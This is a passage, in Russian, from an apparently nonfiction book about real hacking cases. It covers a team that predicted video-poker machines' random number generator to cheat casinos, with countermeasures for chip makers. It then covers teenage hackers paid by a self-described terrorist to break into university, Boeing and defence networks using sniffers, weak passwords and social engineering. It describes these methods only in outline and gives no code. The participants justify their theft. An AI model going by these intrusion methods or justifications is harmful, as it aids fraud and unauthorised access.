иногда кто-то забывал это сделать. Играли они только в казино и никогда не пользовались автоматами в супермаркетах. поскольку «выигрыш там был слишком мал».   ПОПАЛИСЬ  !   Алекс и Майк старались ввести в их команде строгую дисциплину, чтобы «уменьшить вероятность быть пойманными. Среди правил. которые нельзя было нарушать, были такие — никогда не выигрывать слишком много денег в одном месте, нигде не сидеть слишком долго, никогда не ходить в одно место много дней подряд».  Майк относился к дисциплине серьезнее всех, и считал, что двое его компаньонов недостаточно осторожны. Он сам всегда старался выигрывать не так много и быть больше похожим на типичных посетителей казино. Когда у него выпадала выигрышная комбинация, например два туза, а компьютер советовал ему сбросить одного или даже обоих тузов, потому что взамен им должна была прийти еще более выгодная комбинация — три валета, например, — он предпочитал следовать не советам компьютера, а простому здравому смыслу, чтобы не выглядеть странно. Во всех казино существовали системы «Небесное око», попросту говоря — камеры видеонаблюдения в разных местах под потолком всех помещений казино, которые могут поворачиваться и приближать изображение в поисках мошенников, нечестных сотрудников казино, и других стремящихся поживиться легкими деньгами. Как только любой из наблюдателей увидит, что игрок за автоматом сбрасывает два туза, он поймет, что дело нечисто, поскольку ни один нормальный человек так не поступит. Сбрасывать тузы может лишь тот, кто каким-то образом осведомлен о том, что дальше будут еще лучшие карты.  Алекс не был столь предусмотрителен, а Марко — еще в меньшей степени. «Марко всегда был нахалом», — считает Алекс.  «Марко очень умный парень, у него нет высшего образования, он самоучка, тем не менее — это один из самых блестящих представителей Восточной Европы. Яркий и энергичный.  Он знал о компьютерах практически все, но он вбил себе в голову, что в казино работают одни тупицы. Так можно было подумать, поскольку нам удавалось извлекать из казино немало денег. Но все равно, надо было быть очень осторожным.  Он был слишком смелым, мешало ему и то, что выглядел он как иностранный школьник. Он просто притягивал к себе подозрительные взгляды. С ним никогда не было ни жены, ни подружки, что обычно вселяет спокойствие в служащих казино.  Я думал, что, в конце концов, он научится не привлекать к себе внимания. Но время шло, мы становились все опытнее и переходили к более дорогим автоматам, которые давали нам большие выигрыши, а это еще больше повышало риск»…  Хотя Майк не соглашался, Алекс предлагал всем троим, подвергающимся реальной опасности, обсудить то, как далеко они могут заходить в этом риске. Он это формулировал так: «Риск повышается, но надо все время пытаться контролировать его верхнюю планку».  И, наконец, пришел день, когда сидевшего перед автоматом в казино Марко очень быстро окружили сотрудники службы безопасности и потащили в специальную комнату для серьезного разговора. Вот как восстанавливает события Алекс:  «Ситуация была неприятной, поскольку все мы слышали множество историй о том, как такие мальчики выбивают любые признания. Это были ребята из разряда „какая к чертям полиция, мы сами с тобой разберемся!“  Марко был напуган, но у него сильный характер. На самом деле, я был даже рад, что первым из нас поймали его, поскольку он был лучше других подготовлен к такой ситуации. Он спокойнее всех нас мог отнестись к происходящему, используя свой восточноевропейский опыт. Он проявлял всю возможную лояльность к тем, кто его задержал, и не выдал никого из нас. Он не говорил ни слова о партнерах, или чем-то подобном. Он нервничал и был очень испуган, но остался тверд во время допроса и говорил, что работал в одиночку. Он говорил: «Ребята, если я арестован, а вы из полиции, то где обвинение?»  Это была правильная политика, поскольку они не были полицией, и не имели права задерживать его. Они продолжали его допрашивать, но они не имели права его задерживать».  Они забрали все его «оборудование», вспоминает Алекс, конфисковали компьютер и все деньги, которые нашли при нем — около семи тысяч долларов наличными. После часа интенсивного допроса (а может быть, он продолжался и дольше, — Марко был слишком взвинчен, чтобы следить за временем) они отпустили его.  Марко позвонил приятелям по пути домой. Его речь звучала, как у безумного. Он сказал: «Я хочу рассказать вам. ребята, что случилось. Меня прищучили».  Майк отправился прямо в их «штаб-квартиру». « М ы с Алексом сильно испугались, услышав, что случилось. Я начал разламывать наши машины и разбрасывать обломки по всему городу».  Алекс и Майк оба были очень недовольны тем, что случилось с Марко из-за того, что он неразумно рисковал. Он не разместил кнопку своего компьютера в ботинке, как это делали двое других членов команды, упрямо таская компьютер в к а р м а н е пиджака и управляя им рукой, Алекс говорил о Марко, что тот «считает сотрудников безопасности казино такими глупыми, что можно безнаказанно размахивать своим выигрышем перед их носом».  Алекс был уверен, что он понимает, как все произошло, несмотря на то, что он там не присутствовал. На самом деле никто из членов команды не знал, что Марко отправился играть в это казино, несмотря на их договор посвящать друг друга в свои планы. Вот что предполагал Алекс: «Они просто заметили, что он все время держит руку в кармане и выигрывает большие суммы». А Марко даже и в голову не приходило задуматься о том, как он выглядит со стороны заинтересованных наблюдателей, какими были служащие казино.  Для Алекса случившееся означало конец компании, хотя он не знал, как поступят другие. «В самом начале нашей деятельности мы договорились, что если кого-то из нас поймают, то мы все прекращаем. Мы твердо держались этого принципа, насколько я знаю». Через пару минут он добавил менее уверенно: « В о всяком случае, я его придерживался». Майк был с ним согласен, но никто из них ни разу не поговорил с Марко напрямую.  Казино не стало предпринимать никаких шагов даже после того. как один из ребят был пойман. «Причина в том, что они не хотят делать свои слабости достоянием общественности', — объясняет Алекс. — „Реакция казино в таких случаях обычна: „Убирайтесь из города до захода солнца“. Если вы соглашаетесь никогда не заходить больше в казино, они вас отпускают“.   ПОСЛЕДСТВИЯ   Через шесть месяцев Марко получил письмо, где было сказано, что обвинения против него выдвигаться не будут.  После всего, что произошло, ребята остались друзьями, но уже не такими близкими, как в начале всей затеи. Алекс подсчитал, что он заработал около 300 тысяч долларов, часть из которых была отдана Ларри по предварительной договоренности. Изначально трое игравших в казино договаривались, что будут делить всю добычу поровну, но, по мнению Алекса, Майк и Марко заработали от 400 тысяч до полумиллиона долларов. Майк считает, что заработал не больше 300 тысяч долларов, но признает, что Алекс, вероятно, заработал меньше, чем он.  Они делали свое дело около трех лет. Они могли зарабатывать и зарабатывать еще, но Алекс говорит, что был рад, когда все кончилось: «Честно говоря, я наконец-то смог вздохнуть свободно. Удовольствие уже давно испарилось. Это стало настоящей работой, тяжелой и рискованной». Майк тоже был совсем не огорчен, что все кончилось, по его словам «это занятие стало изнурительным».  Сначала оба не хотели ничего рассказывать об этой истории, но затем делали это с удовольствием. И это достаточно естественно — за десять лет после произошедших событий никто из нашей четверки не сказал ни слова о них никому, кроме своих жен и подруг, которые составляли часть истории. Мы заключили с ними договор о полной анонимности, поэтому этот рассказ стал для них своеобразным освобождением. Они поистине наслаждались, вспоминая детали и подробности, и Майк признает, что «это была одна из самых восхитительных вещей в моей жизни».  Скорее всего, Алекс выражает общее мнение, когда говорит об их отношении к произошедшему:  «Я не считаю деньги, которые мы заработали, нечистыми. Это капля в обороте этой индустрии. Говорю от души: мы никогда не чувствовали себя жуликами, поскольку сражались с казино.  Это легко объяснить. Мы отбирали деньги у казино, которые крали их у старушек, предлагая им игры, в которые нельзя выиграть. Лас-Вегас д а е т тебе почувствовать, как люди в м е с т е с четвертаками бросают в щ е л и игровых автоматов кусочки своей жизни. П о э т о м у мы забирали деньги у «большого брата», а не из карманов обычных людей.  Когда они приглашают в а с поиграть, то говорят: « Е с л и вы выберете нужные карты, то вы выиграете». Мы выбрали правильные карты. Они просто не ожидали, что кто-то сможет сделать это».  Алекс говорит, что ничего подобного больше делать не будет. Но по достаточно неожиданной причине: «Сейчас у меня есть другие возможности заработать деньги. Если я окажусь в том же финансовом положении, что был тогда, я, возможно, опять попробую этим заняться». Он считает все, что они делали, вполне приемлемым.  В этой игре кошки с мышкой кошка постоянно изучает новые мышкины фокусы и предпринимает против них соответствующие меры. Игровые автоматы сегодня используют гораздо более качественное ПО; наши ребята совсем не уверены, что им удастся взломать его, если они попытаются совершить еще одну попытку.  И, тем не менее, для любой техники невозможно обеспечить полную безопасность. Алекс так формулирует это; «Как только кто-то скажет: „ Н и у кого не возникнет желания ввязываться в проблемы, чтобы сделать это“, как появятся несколько финских ребятишек, которые как раз и захотят ввязаться в эти проблемы».  И не только финских, но и американских.   АНАЛИЗ   В девяностые годы прошлого века сотрудники казино и конструкторы игровых автоматов еще не осознавали некоторых вещей, которые позднее стали очевидными. Генераторы псевдослучайных чисел на самом деле не генерируют случайные числа. На самом деле они являются наборами чисел, расположенных в произвольном порядке. Даже очень длинный список — от единицы до двух в тридцать второй степени — это всего миллиард чисел. В начале работы программа случайным образом выбирает место в этом списке, но потом, пока она не начнет новый цикл игры, она использует определенную последовательность чисел — одно за другим.  Разбираясь в том, как работает программа игрального автомата, ребята узнали этот перечень. Находясь в любом пункте этого перечня, они знали, какие номера будут выпадать дальше и при помощи некоторых дополнительных сведений о работе программы в автомате они могли определить, через какое время автомат выбросит им королевский флэш.   КОНТРМЕРЫ   Производители любого оборудования, в состав которого входят чипы ROM и программы, должны специально заботиться о проблемах безопасности. А для каждой компании, которая использует устройства на основе компьютеров и программ — что сегодня означает практически любую компанию, вплоть до лавочки с одним продавцом — опасно думать, что ребята, которые создавали эти системы, подумали обо всех возможных лазейках. Программисты ПО для японских игровых автоматов совершили ошибку, не подумав о том, какие атаки могут быть совершены на них. Они никак не защитили свои программы от проникновения в них хакеров. Они должны были предусмотреть такую ситуацию, когда кто-то получит доступ к машине, извлечет из нее чип, прочтет программу, зашитую в него, и восстановит ее текст, который расскажет ему все подробности о работе автомата. Даже если они и думали о такой возможности, то сочли, что точного знания того, как работает автомат, будет недостаточно, поскольку не так-то просто разобраться в работе генератора случайных чисел. Это справедливо сегодня, но в те годы это было не так.  Итак, ваша компания выводит на рынок продукты, которые содержат компьютерные чипы; что необходимо сделать, чтобы обеспечить адекватную защиту от конкурентов, которые, несомненно, хотят заглянуть в ваши программы, от зарубежных компаний, которые захотят сделать дешевые копии ваших товаров, от хакеров, которые хотят обмануть вас?  Первый шаг: постарайтесь затруднить доступ к ПО. Вот как это можно сделать: • приобретайте чипы, защищенные от возможных атак; некоторые компании изготавливают чипы, специально сконструированные для работы в ситуациях, где возможность внешних атак велика:  • используйте практику «встроенного чипа» — конструкцию, в которой чип встроен в материнскую плату таким образом, что его оттуда нельзя извлечь;  • прикрепляйте чип к плате прочным эпоксидным клеем так, чтобы при попытке извлечь его оттуда он ломался; добавление алюминиевого порошка к эпоксидке улучшает крепление, потому что при попытке вынуть чип, разогревая эпоксидку, алюминий разрушает чип;  • используйте технологию BGA (Ball Grid Array); она основана на том, что «ножки» чипа не выходят наружу с боков чипа, а упрятаны под него, что усложняет, а порой и делает невозможным снятие сигналов с ножек чипа, когда он вставлен в материнскую плату.  Еще одна возможная контрмера — уничтожение информации о производителе чипа, так, чтобы атакующий не мог установить тип чипа.  Достаточно распространена и практика контрольных сумм в программах. Если программа меняется, то меняется и ее контрольная сумма и программа в устройстве перестает работать. Однако, опытный хакер, знакомый с этой мерой защиты, может отыскать место в программе, где происходит суммирование и отключить его. Методы физической защиты чипа являются гораздо более надежным средством.   ЗАКЛЮЧЕНИЕ   Если ваше ПО представляет для вас ценность, проконсультируйтесь с экспертами в области безопасности, чтобы понять, какую технику используют сегодня хакеры. Снабжайте ваших программистов и разработчиков самой последней информацией в этой области. И будьте абсолютно уверены в том, что они предпринимают все необходимые меры для обеспечения адекватного уровня безопасности.       Глава 2.    Когда   террорист   звонит      Я не знаю, почему я продолжал работать с ним. Природная склонность? Жажда наживы? Стремление к власти? Я могу перечислить целый ряд причин.      neOh   Двадцатилетний хакер comrade (для непосвященных, если таковые вдруг читают эту книгу, — Comrade, neOh, и др.. — это так называемые «никнеймы», то есть псевдонимы, используемые в Сети —  прим.ред  ), теперь проводит свои дни в компании брата, в принадлежащем им доме, в красивом районе Майами. С ними живет и их отец, но это лишь потому, что брат еще несовершеннолетний, и Служба охраны детства настаивает на том, чтобы в доме жил взрослый человек, пока младшему ребенку не исполнится 18 лет Братьев это не особенно волнует — у папаши есть свое жилье, куда он и отправится, когда придет время.  Мама Comrade скончалась два года н а з а д , оставив дом сыновьям, поскольку с отцом мальчиков они были в разводе. Она оставила им и немного денег. Его брат посещал колледж, a Comrade «просто болтался». Членам его семьи это не нравилось, но по его словам, «его это не колыхало». Когда вы уже побывали в тюрьме в очень юном возрасте, став самым юным хакером, посаженным туда, этот печальный опыт смещает вашу шкалу ценностей.  Хакерство не знает границ, поэтому нет никакой проблемы в том, что друг Comrade, хакер neOh, находится на расстоянии трех тысяч миль от него. Их сдружило хакерство, хакерство привело их на тот скользкий путь, идя по которому, взламывая важные компьютерные системы, желая или не желая этого, они, вполне возможно, сыграли на руку международному терроризму. В наши дни это особенно тяжело осознавать.  neOh на год старше Comrade, и, по его словам, «пользовался компьютером с того момента, как смог дотянуться до клавиатуры». У его отца был компьютерный магазин, и он всегда брал сына на встречи с клиентами; мальчик сидел на коленях у отца во время переговоров. В возрасте одиннадцати лет он написал программу управления базой данных для отцовского бизнеса.  Однажды в руки neOh попалась книга «Takedown» (Hyperion Press, 1996). которая представляет собой крайне некорректное изложение моих собственных хакерских попыток в течение трех лет и погони ФБР за мной. neOh был совершенно захвачен этой книгой.  «Т ы меня просто вдохновил. Ты стал моим долбаным наставником. Я прочел все, что только смог достать о твоих делах. Я хотел стать знаменитостью, как и ты».  Это и привело его на путь хакерства. Он украсил свою комнату компьютерами и сетевыми узлами, водрузил шестифутовый пиратский флаг, и решил отправиться по моим стопам.  neOh начал постигать мастерство хакера. Сначала пришло умение, потом — осторожность. Используя хакерскую терминологию, он поясняет: «Вначале, по хакерскому малолетству (рассказчик употребляет забавное слэнговое выражение „skript kiddie“ — что буквально означает „скриптомалышки“ —  прим. ред.), я залезал на другие Интернет сайты и размещал на них мой адрес электронной почты». Он тусовался на сайтах IRC (Internet Relay Chat) — специальных местах в Интернете, где люди с общими интересами могут встречаться и обмениваться информацией в режиме реального времени с другими такими же любителями поговорить — рыбаками, собирателями антикварных аэропланов, домашними пивоварами или еще тысячей групп любителей того или иного занятия, включая хакерство. Вы можете напечатать любую мысль на IRC-сайте и все, находящиеся на этом сайте, могут прочесть ее и ответить. Мало кто из участников таких переговоров знает, что все они записываются и сохраняются в памяти ПК. В подобных записях уже не меньше слов, чем в Библиотеке Конгресса США, и, несмотря на отсутствие в них глубокого смысла, через годы и даже десятилетия они могут быть прочитаны.  Comrade часто тусовался на некоторых таких сайтах и поддерживал удаленную дружбу с neOh. Хакеры часто образуют подобные альянсы для обмена информацией и организации групповых атак. neOh, Comrade и еще несколько их приятелей решили создать группу под названием «Эльфы Киблера». Три организатора позволяли рядовым членам группы участвовать в переговорах, но не посвящали их в свои планы относительно будущих атак. « М ы залезали на правительственные сайты исключительно для удовольствия». — говорит Comrade. По его оценке, они взломали таким образом «несколько сотен» правительственных сайтов.  IRC-сайты становятся местом сбора различных хакеров. Один из них, под названием Efnet, как говорил Comrade, был «не то, чтобы компьютерный андерграунд — это просто большая группа серверов». Но в Efnet были каналы куда менее известные, такие места, куда самостоятельно ни за что не попасть — нужно, чтобы кто-то знающий и доверяющий вам показал вам дорогу. Вот это, по словам Comrade, и был андерграунд.   ТЕРРОРИСТ   ХАЛИД   ЗАКИДЫВАЕТ   НАЖИВКУ   В 1998 году на этих «каналах андерграунда» Comrade стал встречать человека, который тусовался под именем RahulB. (Позднее он стал использовать имя Rama3456). «Он был из разряда тех, кто подбивает хакеров взламывать правительственные и военные компьютеры — сайты с расширениями .gov и .mil», — вспоминал Comrade. — «Ходили слухи, что он сотрудничает с Бен Ладеном. Это было до 11 сентября 2001 г., поэтому это имя еще мало кто знал».  Достаточно случайно пути Comrade пересеклись еще с одним загадочным человеком, которые представлялся как Халид Ибрагим. «Я разговаривал с ним несколько раз (на сайте IRC) и один раз по телефону». У мужчины был иностранный акцент, и было понятно, «что это соединение с очень далекой страной».  Общался с этим человеком и neOh, но с ним Халид был более прямым и конкретным.  «Где-то в 1999 году я связался по электронной почте с человеком, который назвался боевиком из Пакистана по имени Халид Ибрагим. Он сказал, что работает на пакистанскую повстанческую армию».  А действительно ли до 9 сентября для завоевания сердец наивных молодых хакеров надо было представляться террористом? На первый взгляд такое предположение выглядит совершенно абсурдным. Впоследствии этот человек утверждал, что ходил в обычную американскую школу, немного интересовался хакерством и просто был в их компании. На самом деле, он имел довольно верное представление об образе мыслей и психологии хакеров. Каждый хакер в некоторой степени — отщепенец, смутьян, живущий по отличным от общепринятых стандартам и наслаждающийся борьбой с системой. Если вы хотите привлечь внимание хакеров к себе, вам стоит сказать, что вы такой же бунтарь, нарушающий правила, и эта позиция аутсайдера будет совсем не глупой. Вполне возможно, что она сделает вашу историю более убедительной, а ваших собеседников менее подозрительными и сомневающимися.  И, наконец, немаловажную роль играют деньги. Халид предложил neOh тысячу долларов за проникновение в компьютерную сеть китайского университета — место, которое neOh называет MIT в Китае — и копирование для него базы данных студентов. Вероятно, это была проверка на профессиональную пригодность neOh — не только его хакерских талантов, но и изобретательности: как удастся ему проникнуть в компьютерную систему, если он не понимает языка этой страны? Как применить таланты социальной инженерии там, где ты не знаешь языка?  Как оказалось, для neOh языковая проблема даже не возникла. Он начал тусоваться на сайтах IRC, где часто бывали члены группы gLobaLheLL, где он нашел студента-компьютерщика из нужного ему университета. Он вступил с ним в контакт и попросил достать несколько имен и паролей пользователей. Эта информация была предоставлена ему очень быстро — хакеры не задают друг другу вопроса «зачем», neOh быстро понял, что систему компьютерной безопасности в университете можно описать словами от «ужасная» до «слабая», что было странно для университета с большим числом технологических и инженерных факультетов — они обязаны были бы знать это дело лучше. Большинство студентов выбирали в качестве своих паролей имена, аналогичные их именам пользователей — то же самое слово или фразу.  Полученный им список студентов позволил neOh заняться путешествиями по недрам Интернета, которые хакеры называют специальным термином «sniffing» (можно перевести, как вынюхивание. отсюда sniffer — «нюхач» —  прим. переводчика  ). В конце концов, он отыскал студента, которого мы назовем Чанг, посещавшего сайты в США, откуда он перекачивал информацию. Среди этих сайтов был такой, откуда можно было брать компьютерные программы. Чтобы вступить в контакт с Чангом, ему пришлось узнать несколько сдвиговых словечек, характерных именно для этого университета. Это оказалось сделать легче, чем кажется. Затем он вступил в контакт с Чангом. используя такой адрес и пароль, чтобы казалось, что он находится в компьютерной лаборатории университета.  «Я из корпуса 213», — послал он сообщение Чангу, и спросил у него имена и адреса электронной почты студентов, что выглядело совершенно естественно, поскольку студенты всегда хотят расширить круг своего общения. Поскольку, как уже было сказано, пароли большинства студентов были предельно просты, никакого труда не составило просмотреть их файлы.  Очень скоро он смог послать Халиду базу данных с сотней студенческих имен. «Я ему передал это, а он сказал: „я получил все, что хотел“. Халид был удовлетворен; естественно, ему не нужны были эти имена, он просто хотел убедиться в том, что neOh может получить доступ к информации, даже находясь на большом удалении от ее источника. „Именно тогда начались наши взаимоотношения“, — подытоживает neOh. „Я мог делать работу, он понял, что я могу делать работу и начал давать мне другие задания“.  Халид сказал neOh почаще заглядывать в почтовый ящик, где должен был появиться конверт с тысячью долларов, и начал звонить ему по сотовому телефону примерно раз в неделю, «обычно, когда он был за рулем». Следующим заданием стало проникновение в компьютерную систему Атомного исследовательского центра BhaBha в Индии. Местом для проникновения была выбрана рабочая станция компании Sun Microsystems, хорошо знакомая каждому хакеру. neOh достаточно легко проник в нее, но быстро понял, что в ней не содержится ничего интересного, машина не была присоединена ни к какой сети. Казалось, что Халид нисколько не был разочарован этим.  Деньги за китайский университет все не приходили. Когда neOh спросил об этом. Халид был удивлен. «Ты еще не получил их? Я послал тебе наличные в поздравительном письме!» — настаивал он. Постоянное повторение: «твои деньги в письме» звучало фальшиво, и все же neOh решил продолжить выполнение задания. Почему? Вот как он вспоминает об этом сегодня.  «Я решил продолжить, поскольку я упрямый. Мне очень нравилось думать, что мне заплатят хорошие деньги за подобную работу. Я думал, может быть, письмо действительно затерялось, и он заплатит мне на этот раз.  Я не знал, почему я продолжал работать с ним. Природная склонность? Жажда наживы? Стремление к власти? Можно перечислить целый ряд причин».  Давая задания neOh, Халид искал на IRC-сайтах и других желающих поучаствовать в его работе. Comrade был готов к этому, хотя не хотел получать деньги за свою работу.  «Я понимал, что Халид платит людям, но я никогда не хотел продавать информацию за деньги. Я всегда думал, что пока я просто развлекаюсь, но если я начну получать за это деньги, то стану настоящим преступником. Я был готов пообщаться с ним на IRC, дать ему несколько адресов, но — не больше».  Журналист Нэйл Маккей беседовал с другой «рыбкой», которую Халид поймал в свои сети, с юношей из Калифорнии по кличке Chameleon (который сейчас основал очень успешную компанию, занимающуюся безопасностью). Маккей изложил свою историю на сайте wired.com [1] с некоторыми дополнениями, которые сделали neOh и Comrade. «Я был на сайте IRC, когда этот парень сказал, что ему нужны программы DEM. у меня их не было, и я тогда еще не знал этого парня», — вспоминает хакер. Но это желание Халида было уже достаточно серьезным: «DEM» — это название информационной системы Министерства обороны — Defense Information Systems Network Equipment Manager. Эта программа была захвачена группой хакеров Masters of Downloading («Мастера загрузки») и в среде хакеров ходили слухи, что ее можно получить, если обратиться к нужным людям. Никто не знал — добрался Халид до нее или нет, во всяком случае, никто не упоминал об этом. На самом деле никто не был уверен, что эта программа имеет для Халида какую-то ценность, но он наверняка думал, что имеет. До этих пор Халид занимался безобидными играми с китайскими университетами и подобными вещами.  «Он пытался встроиться в те дела, которыми занимались ребята в этой группе», — вспоминает neOh. «Пока этого не случилось, Халид полтора года тусовался с хакерами — не случайным образом, а постоянно. Он просто всегда был где-то неподалеку, и было ясно, что это его интересует». Под словом «это» neOh понимает проникновение на военные сайты или в коммерческие компании, занимающиеся военными проектами.  Халид попросил neOh проникнуть в компанию Lockheed Martin и получить схемы определенных систем самолетов, которые были сделаны для компании Boeing. neOh проник на определенный уровень в систему компании Lockheed — «на три ступени во внутреннюю сеть», но глубже второго уровня безопасности ему проникнуть не удавалось (этот уровень сотрудники систем безопасности называют « D M Z » — что означает демилитаризованная зона или «земля без людей»). Этого было явно недостаточно, чтобы проникнуть за защитный экран, который охранял самую ценную информацию компании, поэтому ему не удалось раздобыть заказанные сведения.  « Х а л и д был раздражен. О н сказал: « Т ы больше н а м е н я н е работаешь.  Ты ни на что не способен». Но потом он обвинил меня в нечестности. Он сказал, что я придерживаю информацию для себя. Потом он сказал: «Забудь про Lockheed Martin. Проникай прямо в Boeing».  neOh обнаружил, что «Boeing совсем не так уж хорошо защищен, если вы хотите в него проникнуть». По его словам, ему удалось проникнуть в систему компании Boeing, используя достаточно известную лазейку со стороны Интернета. Затем он установил там «нюхач» и получил возможность просматривать все пакеты данных, исходящих из компьютера — своеобразный «жучок» для прослушивания. Он мог перехватывать пароли и незашифрованные электронные письма. Из них ему удалось извлечь достаточно информации для того, чтобы проникнуть во внутреннюю сеть компании.  «Я нашел шесть или семь схем самолета Boeing 747 — просто в обычных письмах. Незашифрованные приложения — разве это не прекрасно?! (NeOh смеется).  Халид просто пришел в экстаз. Он сказал, что заплатит м н е ч е т ы р е тысячи долларов. Но их я так и не увидел — сюрприз, сюрприз!»  На самом деле 4000 долларов было слишком много за полученную информацию. По словам бывшего специалиста компании Boeing по безопасности Дона Боэлинга, подобное проникновение вполне могло было быть реализовано. Но это была пустая трата времени: после того, как самолет поступает в коммерческую эксплуатацию, все авиалинии. на которых он работает, получают полный комплект его чертежей. После этого информация перестает быть секретной; ее может получить каждый, кто стремится это сделать. «Я видел CD со всеми чертежами Boeing-747 на аукционе eBay недавно», — говорит Дон. Вероятно, Халид просто не знал этого. Впрочем, никто не знал этого еще два года, пока вся страна не обнаружила, что у террористов были важные причины получить в свое распоряжение чертежи транспортных самолетов, летающих на авиалиниях США.   ЦЕЛЬ   НА   ВЕЧЕР  :   SIPRNet   С Comrade Халид не утруждал себя проверками. Хакер говорит, что с самого начала Халида «интересовали только военные и SIPRNet».  «Он всегда был не слишком конкретен в своих запросах — просто доступ к правительственным и военным сайтам. За исключением S I P R N e t . Он действительно хотел получить информацию о SIPRNet».  И это была достойная мишень. SIPRNet — это была часть DISN, Defense Information System Network (Сеть оборонной информации), которая содержала важные сведения. SIPRNet — сокращение от Secret Internet Protocol Router Network (секретный Интернет-протокол маршрутизатора сети) — это ядро управления для американской армии.  neOh уже отказался от предложения Халида проникнуть в SIPRNet:  « О н предложил две тысячи долларов. Я отказался. Е с л и бы я проник в SIPRNet, федеральная полиция оказалась бы у моих дверей. Две тысячи долларов — недостаточная цена за пулю в голове».  К тому моменту Халид уже переговорил с Comrade об этой работе, цена ее быстро возрастала. «Он сказал, что готов заплатить 10 000 долларов за доступ» — вспоминает Comrade, и это было более достойное предложение, чем сделанное neOh, хотя Comrade настаивает, что им двигало только чувство спортивного азарта, но уж никак не деньги.  «Я подошел совсем близко к S I P R N e t . Я проник в компьютерную систему D I S A (Defense Information Security Agency — Агентство по информационной безопасности м и н и с т е р с т в а обороны). Э т о б ы л превосходный компьютер с четырьмя процессорами, около двух тысяч пользователей работало с ним, на н е м было около п я т и т ы с я ч Unix-хостов и половина из них б ы л а привилегированными; чтобы попасть в них, вы должны были зайти именно с этого компьютера, извне в них попасть было просто невозможно».  Осознав это, Comrade понял, что целью Халида является нечто действительно серьезное. Главной задачей DISA была поддержка управления военными действиями — здесь ее функции перекрывались с SIPRNET. Но активность хакера была быстро пресечена.  «Прикольно было иметь все эти коды, но я не успел поиграть с ними.  Уже на четвертый день я попался».   ТРЕВОЖНЫЕ   ДНИ   В канун Рождества в 1999 году neOh и Comrade испытали серьезную встряску. Самолет индийских авиалиний IC-814 во время рейса из Катманду в Нью-Дели со 178 пассажирами и 11 членами экипажа на борту был захвачен террористами. Как сообщали выпуски новостей, это были пакистанские террористы, связанные с движением Талибан, к которому принадлежал и Халид, по его словам.  По приказу террористов, Airbus A300 проследовал по сложному маршруту на средний Восток и обратно, приземлившись ненадолго в Индии, Пакистане и Арабских Эмиратах, где было оставлено тело убитого пассажира, молодого человека, возвращавшегося домой со своей женой после медового месяца. Он был приговорен к смерти лишь за то, что отказался надеть на глаза повязку.  Потом самолет приземлился в Кандагаре (Афганистан), что еще яснее обозначило связи террористов с движением Талибан. Оставшиеся пассажиры и экипаж удерживались на борту восемь ужасных дней и были освобождены в обмен на освобождение трех военных преступников. Один из освобожденных. Шейх Умер, потом будет играть заметную роль в финансировании Мохаммеда Ата, организатора атак 11 сентября на башни торгового центра в Нью-Йорке.  После угона самолета Халид сообщил neOh, что его группа и он сам берут на себя ответственность за эту акцию.  «Это напугало меня до смерти. Он был совсем плохой парень. Я чувствовал, что мне пора спасать свою задницу».  Однако его испуг причудливо сочетался с мальчишеским упрямством: «Я все еще надеялся, что он заплатит мне причитающиеся мне деньги».  Связь с угоном самолета добавила горючего в тот огонь, который разжигал Халид. Разочарованный тем, что не всегда хакеры могли достать ему требуемую информацию, Халид перешел к тактике сильного давления. В уже упомянутой статье для Wired.com журналист Нэйл Маккей писал, что он видел, как на сайте IRC Халид угрожал убить собеседников, если они сообщат о нем в ФБР. Маккей писал, что он видел и такое письмо от п а к и с т а н ц а : «Я хочу знать, говорил ли кто-нибудь полицейским обо мне?». И еще одно письмо в другом месте: «Передай им, если они сделали это. то они уже мертвецы. Я наведу на них снайперов». [2]    COMRADE   АРЕСТОВАН   Ситуация была паршивой, и со временем она становилась только хуже. Через несколько дней после успешного проникновения Comrade в систему, связанную с SIPRNet, его отца остановили на улице полицейские. Они сказали «М ы хотим побеседовать с вашим сыном» и показали ему ордер на обыск. Comrade вспоминает:  «Там были люди из НАСА и ФБР. Всего их было человек десять-двенадцать, плюс еще несколько полицейских. Я действительно проникал на некоторые сайты НАСА, я установил свой „нюхач“ на сайте ns3.gtra.mil для того, чтобы получить нужные мне пароли. Для этого мне пришлось просматривать всю электронную почту. Пришедшие сказали мне, что я обвиняюсь в нелегальном прослушивании, нелегальном проникновении в компьютеры НАСА, а также других вещах.  Буквально за день до этого, мой приятель сказал мне: «Старина, нас скоро схватят». Видно было, что он уже свыкся с этой мыслью, Я согласился с ним: «Да, они наверняка нас выследили». Поэтому я удалил все файлы с диска в компьютере».  Однако Comrade, как обычно, все делал небрежно, и забыл удалить файлы со старых дисков, которых было немало на его столе. «Они допрашивали меня, я соглашался с их обвинениями. Я сказал: „Я очень сожалею обо всем, что я сделал. Как нам все это уладить? Я обещаю больше так не поступать“. Казалось, что они были довольны: „ В с е хорошо, мы не считаем в а с преступником, никогда больше не делайте этого. Е с л и вы еще раз так поступите, то окажетесь в наручниках“. Они забрали с собой все мои компьютеры, периферийные устройства, запасные жесткие диски и ушли».  Через некоторое время они попросили у Comrade пароли к его жестким дискам. Он не дал пароли, тогда они сказали, что без проблем найдут их самостоятельно. Comrade был спокоен: он использовал схему PGP-шифрования и его пароль был «длиной в сто символов». При этом он говорил, что его не так сложно запомнить — это были три его любимые цитаты, написанные одна за другой.  Comrade не слышал о них больше шести месяцев. Затем однажды он узнал, что правительство собирается выдвинуть против него обвинения. Когда он оказался в суде, то был ошарашен тем, в чем его обвиняют — это был вывод компьютеров Н А С А из строя на три недели и перехват тысяч электронных писем министерства обороны.  (Между тем «вредом», который фигурирует в обвинении и реальным вредом, нанесенным обвиняемым, есть большая разница. Comrade перегружал себе программы из Центра управления полетами Н А С А имени Маршалла в Алабаме, который занимался исключительно контролем температуры и влажности на международной космической станции; правительство же инкриминировало ему вывод из строя на три недели всей компьютерной системы Н А С А . Утверждение об атаке Министерства обороны было более осмысленным: Comrade проник в компьютерную систему Агентства по снижению угроз и установил там специальную программу, которая у хакеров называется «черный ход», это позволяло ему проникать туда в любой момент).  По мнению правительства, случай заслуживал самого серьезного рассмотрения, как предупреждение для других несовершеннолетних хакеров. О нем планировалось рассказать в прессе, как о случае наказания самого юного хакера за серьезные преступления. Генеральный прокурор Джанет Рено даже сделала специальное заявление: «Этот случай станет первым, когда такой юный хакер будет заключен в тюрьму, мы хотим продемонстрировать, что считаем проникновение в компьютерные системы серьезным преступлением и вместе с нашими коллегами будем активно этому противодействовать'.  Судья приговорил Comrade к шести месяцам заключения в тюрьме и шести месяцам последующего пребывания под наблюдением инспектора (приговор должен быть вступить в силу после окончания учебного года). Мать Comrade в то время была еще жива; она наняла нового адвоката, написала кучу прошений, напирая на то, что ее сын «стал другим человеком», и, как это не удивительно, она добилась пересмотра приговора до домашнего ареста и четырех лет нахождения под наблюдением.  Однако, в жизни мы не всегда используем шанс 